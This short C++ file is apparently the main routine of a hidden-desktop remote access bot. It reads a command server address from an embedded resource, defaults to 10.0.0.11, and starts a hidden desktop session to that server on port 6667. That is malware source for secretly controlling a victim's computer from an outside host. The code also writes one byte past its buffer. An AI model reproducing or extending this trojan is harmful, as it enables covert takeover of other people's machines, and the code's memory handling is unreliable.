
#pragma (linker, "/defaultlib:ntdll.lib")
#define BOT_ID_LEN 35

#define SECURITY_WIN32
#pragma warning(disable: 4267)
#pragma warning(disable: 4244)
#pragma warning(disable: 4533)
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <WinInet.h>
#include <TlHelp32.h>
#include <Security.h>
#include <Psapi.h>
#include<string>


#include <cstring>
#include <iostream>
#include <Shlwapi.h>

#include "API.h"
#include "Utils.h"


#include "HiddenDesktop.h"
#include "json.h"




int main()
{
	char* server;
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(10), RT_RCDATA);
	HGLOBAL hMemory = LoadResource(hModule, hResource);
	DWORD dwSize = SizeofResource(hModule, hResource);
	LPVOID lpAddress = LockResource(hMemory);
	char* bytes = new char[dwSize];
	memset(bytes, 0x00, dwSize + 1);
	memcpy(bytes, lpAddress, dwSize);

	if (strlen(bytes) > 0)
	{
	    server = bytes;
	}
	else {
		server = (char*)"10.0.0.11";
	}
	std::cout << server;
	StartHiddenDesktop(server, 6667);
}
